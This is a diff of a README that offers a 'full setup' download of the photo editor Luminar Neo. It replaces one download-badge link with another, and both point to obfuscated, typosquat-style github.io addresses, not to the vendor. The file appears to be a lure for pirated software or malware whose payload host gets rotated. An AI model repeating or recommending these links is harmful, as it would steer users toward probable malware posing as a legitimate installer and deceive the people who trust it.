@@ -9,7 +9,7 @@ Unlock the future of photo editing with **Luminar Neo**, the next-generation AI-
 ---
 
 ### ⬇️ Download Full Setup  
-[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-green?style=for-the-badge&logo=windows)](https://raaumnelumina1rneowebw.github.io/.github/)
+[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-green?style=for-the-badge&logo=windows)](https://luminar1neodownl0ad1aiinf0.github.io/.github/)
 
 ---
 
